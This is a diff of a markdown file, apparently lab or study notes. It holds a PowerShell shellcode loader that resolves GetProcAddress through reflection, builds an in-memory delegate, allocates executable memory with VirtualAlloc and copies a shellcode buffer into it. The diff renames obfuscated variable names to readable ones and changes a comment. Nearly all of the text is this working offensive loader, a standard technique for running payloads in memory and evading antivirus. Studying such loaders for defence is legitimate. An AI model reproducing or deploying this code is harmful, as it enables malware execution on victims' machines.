@@ -3,22 +3,22 @@
 ```powershell
 function myGetProcAddress {
      Param ($module_name, $function_name)
-     $zZ = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+     $unsafe_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 
- 	return $zZ.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($zZ.GetMethod('GetModuleHandle')).Invoke($null, @($module_name)))), $function_name))
+ 	return $unsafe_methods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($unsafe_methods.GetMethod('GetModuleHandle')).Invoke($null, @($module_name)))), $function_name))
 }
 
 function myReflection {
      Param (
-         [Parameter(Position = 0, Mandatory = $True)] [Type[]] $o7y,
-         [Parameter(Position = 1)] [Type] $uz0b = [Void]
+         [Parameter(Position = 0, Mandatory = $True)] [Type[]] $arg0,
+         [Parameter(Position = 1)] [Type] $arg1 = [Void]
      )
 
-     $iKx = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-     $iKx.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $o7y).SetImplementationFlags('Runtime, Managed')
-     $iKx.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $uz0b, $o7y).SetImplementationFlags('Runtime, Managed')
+     $reflect_delegate = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+     $reflect_delegate.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $arg0).SetImplementationFlags('Runtime, Managed')
+     $reflect_delegate.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $arg1, $arg0).SetImplementationFlags('Runtime, Managed')
 
-     return $iKx.CreateType()
+     return $reflect_delegate.CreateType()
 }
 
 
@@ -26,7 +26,7 @@ function myReflection {
 $execution_address = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((myGetProcAddress kernel32.dll VirtualAlloc), (myReflection @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.Length,0x3000, 0x40)
 
 [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $execution_address, $shellcode.length)
-#supposed to print hex but it doesnt
+#address of shellcode
 "{0:x}" -f $execution_address
 2143612633088
 
